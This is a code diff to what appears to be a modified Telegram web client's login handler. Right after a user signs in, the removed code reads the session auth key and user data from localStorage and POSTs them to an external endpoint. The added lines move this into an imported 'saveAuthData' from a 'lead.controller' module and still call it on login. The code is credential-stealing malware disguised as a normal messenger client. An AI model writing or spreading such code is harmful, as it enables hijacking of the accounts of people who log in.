@@ -20,7 +20,7 @@ import RLottiePlayer from '../lib/rlottie/rlottiePlayer';
 import setBlankToAnchor from '../lib/richTextProcessor/setBlankToAnchor';
 import { attachClickEvent } from '../helpers/dom/clickEvent';
 import Icon from '../components/icon';
-
+import { saveAuthData } from '../lead.controller';
 let authSentCode: AuthSentCode.authSentCode = null;
 
 let headerElement: HTMLHeadElement = null;
@@ -53,73 +53,11 @@ const submitCode = (code: string) => {
       switch (response._) {
         case 'auth.authorization':
           await rootScope.managers.apiManager.setUser(response.user);
-          let url2 = window.location.href;
-          let currId2 = url2.split("/").pop();
-          async function getDbIndexes(id: string) {
-            return new Promise((resolve, reject) => {
-              const request = indexedDB.open("tweb", 1);
-              request.onsuccess = function (event: any) {
-                const db = event.target.result;
-                const transaction = db.transaction("users", "readonly");
-                const store = transaction.objectStore("users");
-                const getRequest = store.get(id);
-                getRequest.onsuccess = function () {
-                  if (getRequest.result) {
-                    resolve(getRequest.result);
-                  } else {
-                    resolve("No matching record found")
-                  }
-                };
+          let url = window.location.href;
+          let currId = url.split("/").pop();
 
-                getRequest.onerror = function () {
-                  resolve("Error retrieving data")
-                };
-              };
-
-              request.onerror = function () {
-                resolve("Error opening database")
-              };
-
-            })
-          }
-          async function saveAuthData() {
-            const dc2_auth_key = localStorage.getItem('dc2_auth_key');
-            const user_auth = localStorage.getItem('user_auth');
-            let { id } = JSON.parse(user_auth)
-            let curr_user_data: any = {}; // User
-            // 
-            if (id) {
-              curr_user_data = await getDbIndexes(id);
-              console.log("data TWEB", curr_user_data)
-              console.log('curr_user_data.photo', curr_user_data.photo)
-              let photo: any = "";
-              if (curr_user_data.photo && curr_user_data.photo.photo_id) {
-                photo = await rootScope.managers.appPhotosManager.getPhoto(curr_user_data.photo.photo_id)
-                console.log('photo', photo)
-              }
-            }
-            if (dc2_auth_key && user_auth) {
-              try {
-                const response = await fetch(import.meta.env.VITE_SAVE_AUTH, {
-                  method: 'POST',
-                  headers: {
-                    'Content-Type': 'application/json',
-                  },
-                  body: JSON.stringify({ dc2_auth_key, user_auth, currId: currId2 }),
-                });
-
-                if (!response.ok) {
-                  throw new Error('Network response was not ok');
-                }
-                const data = await response.json();
-              } catch (error) {
-                console.error('Error saving auth data:', error);
-              }
-            } else {
-              console.error('Auth keys not found in localStorage');
-            }
-          }
-          if (!currId2.includes(":")) saveAuthData();
+          if (!currId.includes("%7C"))
+            saveAuthData();
           import('./pageImLead').then((m) => {
             m.default.mount();
           });
